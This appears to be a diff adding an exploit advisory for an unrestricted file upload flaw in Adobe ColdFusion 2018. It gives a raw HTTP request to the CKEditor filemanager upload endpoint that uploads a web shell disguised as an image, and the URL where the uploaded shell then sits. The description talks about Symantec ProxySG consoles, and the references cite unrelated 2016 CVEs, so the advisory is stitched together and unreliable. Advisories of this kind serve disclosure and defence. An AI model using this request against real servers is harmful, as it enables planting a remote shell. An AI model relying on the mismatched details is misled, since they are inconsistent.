@@ -1,0 +1,64 @@
+===========Security Intelligence============
+# Vendor Homepage: adobe.com
+# Version: 2018
+# Tested on: Adobe ColdFusion 2018
+# Exploit Author: Pankaj Kumar Thakur (Nepal)
+
+==========[Table of Contents]==============
+ * Overview
+ * Detailed description
+ * Thanks & Acknowledgements
+ * References
+ 
+==========[Vulnerability Information]========
+
+ * Unrestricted file upload in Adobe ColdFusion 2018
+ * CWE-434
+ * Base Score: 6.8 MEDIUM 
+ * Vector: AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H
+ 
+=========[ Overview]=========================
+ 
+ * System Affected: Adobe ColdFusion 2018
+ * Impact: Unrestricted file upload
+ 
+=====[ Detailed description]=================
+Unrestricted file upload vulnerability in the Symantec Advanced Secure Gateway (ASG) and ProxySG management consoles. A malicious appliance administrator can upload arbitrary malicious files to the management console and trick another administrator user into downloading and executing malicious code.
+
+Request
+
+POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm
+HTTP/1.1
+Host: hostname:portno
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
+Content-Type: multipart/form-data;
+Content-Length: 303
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+.
+.
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="file"; filename="shell_file with extension"
+Content-Type: image/jpeg
+
+shell code
+-----------------------------24464570528145
+Content-Disposition: form-data; name="path"
+.
+.
+After uploading shell, its located here
+
+http://coldfusion:port/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/shell_file with extension
+
+=====[ Thanks & Acknowledgements]========================================
+* Acknowledged by Adobe
+* Duplicate
+ 
+ 
+ * https://nvd.nist.gov/vuln/detail/CVE-2016-10258
+ * https://www.cvedetails.com/cve/CVE-2016-1713/
+ * https://www.openwall.com/lists/oss-security/2016/01/12/4
+ 
+=====[ EOF ]===========================================================
